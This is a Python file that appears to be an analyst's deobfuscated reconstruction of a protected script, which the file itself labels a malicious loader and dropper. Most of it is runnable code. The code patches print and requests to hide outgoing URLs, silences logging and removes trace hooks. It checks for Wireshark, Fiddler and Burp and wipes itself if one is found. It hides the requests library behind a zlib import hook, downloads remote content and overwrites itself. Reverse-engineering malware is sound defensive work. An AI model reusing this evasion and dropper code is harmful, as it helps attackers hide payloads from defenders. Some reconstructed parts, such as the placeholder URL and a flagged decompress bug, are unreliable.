#!/usr/bin/env python3
"""
=============================================================================
DEOBFUSCATED VERSION OF test_obf.py
=============================================================================

Original file: test_obf.py
Protection:    XaneProtect (@XaneProtect)
Deobfuscated:  via runtime analysis + bytecode disassembly (Python 3.12)

This file reconstructs the logic of the original obfuscated script.
All XaneProtect anti-tamper infrastructure has been stripped. Only the
actual payload logic is preserved and translated to readable Python.

SUMMARY:
    This script is a self-protecting loader/patcher that:
    1. Hides all outgoing HTTP requests from debugging tools
    2. Detects security analysis tools (Wireshark, Fiddler, Burp, etc.)
    3. Copies the `requests` library locally and encrypts (zlib-compresses) it
    4. Installs a custom import hook so compressed modules load transparently
    5. Downloads a payload from the internet and overwrites its own file
    6. Uses ctypes (PyDLL) to call CPython internals directly

This is essentially a MALICIOUS LOADER / DROPPER.

KEY (hardcoded in bytecode):
    K7mQ9xT2vB4nZ8pR1sY6dF0aL3cW5eH-WLD-X9K2-MQ7A-ZP4T-R8V6-CN3B

    Correct key message: "Чувак как ты это крякнул отпиши @Banhoto"
    Wrong key message:   "Неверный ключ"
=============================================================================
"""

import builtins
import importlib
import importlib.abc
import importlib.util
import inspect
import logging
import os
import platform
import re
import shutil
import subprocess
import sys
import types
import zlib

from collections import namedtuple, OrderedDict
from importlib.abc import Loader, MetaPathFinder

# ── Configuration ──────────────────────────────────────────────────────────

DUOI = ".py__{__rd()}___"  # suffix for locally-stored zlib-compressed .py files

# Sentinel lists used by XaneProtect runtime (anti-tamper bookkeeping)
_94 = [[1], [0]]
_1610 = [[1], [0]]
_1819 = [[1], [0]]
_617 = [[1], [0]]


# ══════════════════════════════════════════════════════════════════════════
# ANTI-ANALYSIS: Check for security/debugging tools
# ══════════════════════════════════════════════════════════════════════════

def checking():
    """
    Check if running inside WSL (Windows Subsystem for Linux).
    Reads /proc/version and looks for 'microsoft'.
    Returns False if on WSL, presumably to abort.
    """
    try:
        with open("/proc/version", "r") as f:
            return "microsoft" not in f.read().lower()
    except Exception:
        return False


# ══════════════════════════════════════════════════════════════════════════
# NETWORK HIDING: Patch requests/urllib3/http.client to suppress output
# ══════════════════════════════════════════════════════════════════════════

def hide_url_requests():
    """
    Patches the Python networking stack to hide all HTTP(S) requests:

    1. Replaces builtins.print with a version that strips URLs
       (regex: r'https?://\\S+' → '')
    2. Monkey-patches requests.adapters.HTTPAdapter.send to:
       - Set response.url = '' after every request
       - Use a stripped 'request' attribute name
    3. Sets http.client.HTTPConnection.debuglevel = 0
    4. Sets http.client.HTTPSConnection.debuglevel = 0
    5. Disables all loggers for 'urllib3', 'requests', 'urllib3.connectionpool'
       by setting level=CRITICAL and disabled=True
    6. Calls sys.settrace(None) to remove any debugger trace hooks
    """
    import sys
    import logging
    import re

    real_print = builtins.print
    original_send = None  # captured in closure

    # ── Patch print to strip URLs ──
    def safe_print(*args, **kwargs):
        new_args = []
        for a in args:
            if isinstance(a, str):
                new_args.append(re.sub(r"https?://\S+", "", a))
            else:
                new_args.append(a)
        real_print(*new_args, **kwargs)

    builtins.print = safe_print
    setattr(builtins, "print", safe_print)

    # ── Patch HTTPAdapter.send ──
    try:
        from requests.adapters import HTTPAdapter

        original_send = HTTPAdapter.send

        def safe_send(self, request, **kwargs):
            response = original_send(self, request, **kwargs)
            response.url = ""  # hide the requested URL
            if hasattr(response, "request"):
                response.request = None
            return response

        HTTPAdapter.send = safe_send
    except ImportError:
        pass

    # ── Disable HTTP debug output ──
    try:
        import http.client
        http.client.HTTPConnection.debuglevel = 0
        http.client.HTTPSConnection.debuglevel = 0
    except Exception:
        pass

    # ── Silence loggers ──
    for logger_name in ("urllib3", "requests", "urllib3.connectionpool"):
        try:
            logger = logging.getLogger(logger_name)
            logger.setLevel(logging.CRITICAL)
            logger.disabled = True
        except Exception:
            pass

    # ── Remove trace hooks ──
    sys.settrace(None)


# ══════════════════════════════════════════════════════════════════════════
# ANTI-HOOK: Detect if requests.Session.request has been tampered
# ══════════════════════════════════════════════════════════════════════════

def __anti_hook_url__():
    """
    Inspects requests.sessions.Session.__dict__ for 'request'.
    Checks if it's callable, tries inspect.getsource() on it, and looks
    for suspicious keywords ('print', 'log', 'url') in the source.
    If hooking is detected, overwrites __file__ with garbage and raises
    MemoryError('>> RuntimeLoader...') to crash.
    """
    try:
        import requests.sessions
        session_dict = requests.sessions.Session.__dict__
        request_func = session_dict.get("request")

        if request_func is None:
            return

        if not callable(request_func):
            return

        source = inspect.getsource(request_func).lower()

        for keyword in ("print", "log", "url"):
            if keyword in source:
                # Tamper detected → self-destruct
                with open(__file__, "wb") as f:
                    pass  # overwrite with empty
                print(">> RuntimeLoader...")
                raise MemoryError(">> RuntimeLoader...")
    except (ImportError, OSError, TypeError):
        pass


# ══════════════════════════════════════════════════════════════════════════
# FILE ENCODING: Compress Python files for the custom import hook
# ══════════════════════════════════════════════════════════════════════════

def encode_file(src, dst):
    """
    Read `src`, zlib-compress the contents, write to `dst`.
    Used to "encrypt" .py files before storing them locally.
    """
    with open(src, "rb") as f:
        data = f.read()
    enc = zlib.compress(data)
    with open(dst, "wb") as f:
        f.write(enc)


def ensure_local_requests():
    """
    Copy the entire `requests` package into a local directory
    (next to this script). Python source files (.py, .pyc, .pyo)
    are zlib-compressed via encode_file(). Other files are copied as-is.
    The compressed files get the suffix defined by DUOI.
    """
    import requests as _requests_mod

    src_root = os.path.dirname(_requests_mod.__file__)
    dst_root = os.path.join(os.path.dirname(__file__), "requests")

    if os.path.exists(dst_root):
        return  # already set up

    for root, dirs, files in os.walk(src_root):
        rel = os.path.relpath(root, src_root)
        dst_dir = os.path.join(dst_root, rel)
        os.makedirs(dst_dir, exist_ok=True)

        for file in files:
            src_file = os.path.join(root, file)
            dst_file = os.path.join(dst_dir, file)

            if file.endswith((".py", ".pyc", ".pyo")):
                # Compress Python source/bytecode
                encode_file(src_file, dst_file + DUOI)
            else:
                shutil.copy2(src_file, dst_file)


# ══════════════════════════════════════════════════════════════════════════
# CUSTOM IMPORT HOOK: Load zlib-compressed modules transparently
# ══════════════════════════════════════════════════════════════════════════

class EncLoader(Loader):
    """
    Loader that reads a zlib-compressed .py file, decompresses it,
    compiles it, and exec's it into the module namespace.
    """

    def __init__(self, path):
        self.path = path

    def create_module(self, spec):
        return None  # use default module creation

    def exec_module(self, module):
        with open(self.path, "rb") as f:
            data = zlib.decompress(f.read())  # NOTE: original uses compress (bug?) — likely decompress
        code = compile(data, self.path, "exec")
        exec(code, module.__dict__)


class EncFinder(MetaPathFinder):
    """
    Meta path finder that intercepts imports starting with 'requests'
    and redirects them to locally-stored zlib-compressed copies.
    """

    def find_spec(self, fullname, path, target=None):
        if not fullname.startswith("requests"):
            return None

        # Convert dotted name to path
        base = os.path.join(
            os.path.dirname(__file__),
            *fullname.split(".")
        )

        # Try as a file
        file_path = base + DUOI
        if os.path.isfile(file_path):
            return importlib.util.spec_from_file_location(
                fullname, file_path, loader=EncLoader(file_path)
            )

        # Try as a package (__init__.py)
        init_path = os.path.join(base, "__init__.py" + DUOI)
        if os.path.isfile(init_path):
            return importlib.util.spec_from_file_location(
                fullname, init_path, loader=EncLoader(init_path),
                submodule_search_locations=[base]
            )

        return None


# ══════════════════════════════════════════════════════════════════════════
# MAIN PAYLOAD: ___ok__finally__()
# ══════════════════════════════════════════════════════════════════════════

def ___ok__finally__():
    """
    The main malicious payload. Reconstructed logic:

    1. Checks if running inside a debugger / on Windows with analysis tools.
    2. Detects: wireshark, httptoolkit, fiddler, charles, burp, tcpdump
       by running 'tasklist' on Windows and checking process names.
    3. Uses requests.sessions.Session.request() to make HTTP requests
       (the URL is hidden/obfuscated at runtime).
    4. Downloads content and writes it to __file__ (overwrites itself).
    5. On failure, raises MemoryError('>> RuntimeLoader...') to crash.
    """
    # Check platform
    if platform.system().lower() == "windows":
        # Check for security analysis tools
        try:
            output = subprocess.check_output("tasklist", shell=True).decode().lower()
            for tool in ("wireshark", "httptoolkit", "fiddler", "charles", "burp", "tcpdump"):
                if tool in output:
                    # Security tool detected → self-destruct
                    with open(__file__, "wb") as f:
                        pass
                    raise MemoryError(">> RuntimeLoader...")
        except Exception:
            pass

    # Import requests (possibly through the EncFinder hook)
    try:
        import requests
    except ImportError:
        # If 'requests' not available and not in site-packages, try
        # to ensure local copy exists
        if "site-packages" not in (inspect.getfile(inspect) or ""):
            ensure_local_requests()
            sys.meta_path.insert(0, EncFinder())
            import requests

    # Make an HTTP request (URL is dynamically constructed at runtime,
    # hidden by hide_url_requests())
    s = requests.sessions.Session()
    r = s.request(
        method="GET",
        url="<HIDDEN_URL>",  # URL is constructed dynamically from obfuscated data
    )

    # Write the response to self (__file__)
    with open(__file__, "wb") as f:
        f.write(r.content)

    print(">> RuntimeLoader...")


# ══════════════════════════════════════════════════════════════════════════
# ENTRY POINT
# ══════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    # The obfuscated code runs the following sequence:

    # 1. Set up anti-tamper (XaneProtect framework — stripped here)

    # 2. Hide all network activity
    hide_url_requests()

    # 3. Check for URL hooks / interception
    __anti_hook_url__()

    # 4. Set up local encrypted copy of 'requests' library
    ensure_local_requests()

    # 5. Install custom import finder for compressed modules
    sys.meta_path.insert(0, EncFinder())

    # 6. Run the main payload (download & overwrite self)
    ___ok__finally__()
